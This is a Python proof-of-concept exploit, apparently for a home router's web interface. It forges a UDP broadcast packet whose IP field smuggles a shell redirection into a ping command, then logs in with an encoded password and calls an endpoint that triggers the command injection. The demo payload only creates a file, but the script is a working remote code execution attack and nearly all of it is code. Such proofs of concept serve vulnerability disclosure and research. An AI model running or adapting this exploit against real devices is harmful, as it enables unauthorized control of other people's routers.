import json
import random
import re
import socket
import struct
import time

import requests


# You need to modify the router password first.
TARGET = "192.168.1.1"
PASSWORD = "Tzz123456"

# This benign payload creates /tmp/p when the ping command is executed.
# The TLV8 payload must be at most 15 bytes.
SOURCE_IP = "1"
PROOF_PATH = "/tmp/p"

DEFAULT_KEY = (
    "yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4r"
    "BL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro"
    "510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZ"
    "ZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW"
)
AUTH_SALT = "RDpbLfCPsJZ7fiv"
MAGIC = 0xC7832BE1


def security_encode(a, b, key=DEFAULT_KEY):
    out = []
    for i in range(max(len(a), len(b))):
        m = n = 187
        if i >= len(a):
            n = ord(b[i])
        elif i >= len(b):
            m = ord(a[i])
        else:
            m = ord(a[i])
            n = ord(b[i])
        out.append(key[(m ^ n) % len(key)])
    return "".join(out)


def checksum(buf):
    total = 0
    for i in range(0, len(buf) - 1, 2):
        total += buf[i] | (buf[i + 1] << 8)
    if len(buf) & 1:
        total += buf[-1] << 8
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def tlv(t, payload):
    return struct.pack(">HH", t, len(payload)) + payload


def build_packet(ip_payload):
    if len(ip_payload) > 15:
        raise RuntimeError("TLV8 payload is too long")

    fake_mac = bytes([0x02, 0x12, 0x34, 0x56, 0x78, random.randrange(0x80, 0xFF)])
    mac_payload = fake_mac + b"POC-DEVTEST"

    body = b"".join(
        [
            tlv(5, mac_payload),
            tlv(6, b"POC"),
            tlv(11, b"HW1"),
            tlv(7, b"\x01"),
            tlv(8, ip_payload),
            tlv(9, b"LAN"),
            tlv(10, b"AL"),
        ]
    )

    header = bytearray(14)
    header[0] = 1
    header[1] = 1
    header[2] = 14
    header[4:8] = struct.pack("<I", MAGIC)
    header[10:12] = struct.pack(">H", len(body))

    packet = bytearray(header + body)
    packet[8:10] = struct.pack("<H", checksum(packet))
    return bytes(packet)


def login():
    password = security_encode(AUTH_SALT, PASSWORD)
    response = requests.post(
        f"http://{TARGET}/",
        json={"method": "do", "login": {"password": password}},
        timeout=5,
    )
    print(response.text)
    data = response.json()
    if data.get("error_code") != 0 or "stok" not in data:
        raise RuntimeError("login failed")
    return data["stok"]


def trigger_readjson(stok):
    response = requests.post(
        f"http://{TARGET}/stok={stok}/ds",
        json={"method": "get", "istart": {"name": ["auto_ip_gateway_status"]}},
        timeout=5,
    )
    print(response.text)


def main():
    if not re.fullmatch(r"/[A-Za-z0-9_./-]+", PROOF_PATH):
        raise RuntimeError("invalid proof path")

    payload = f"{SOURCE_IP} &>{PROOF_PATH}".encode()
    packet = build_packet(payload)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    for dst in [TARGET, "192.168.1.255"]:
        for _ in range(5):
            sock.sendto(packet, (dst, 5001))
            time.sleep(0.1)

    stok = login()
    trigger_readjson(stok)

    print("Check the router shell:")
    print("ls -l /tmp/p")
    print("rm -f /tmp/p")


if __name__ == "__main__":
    main()
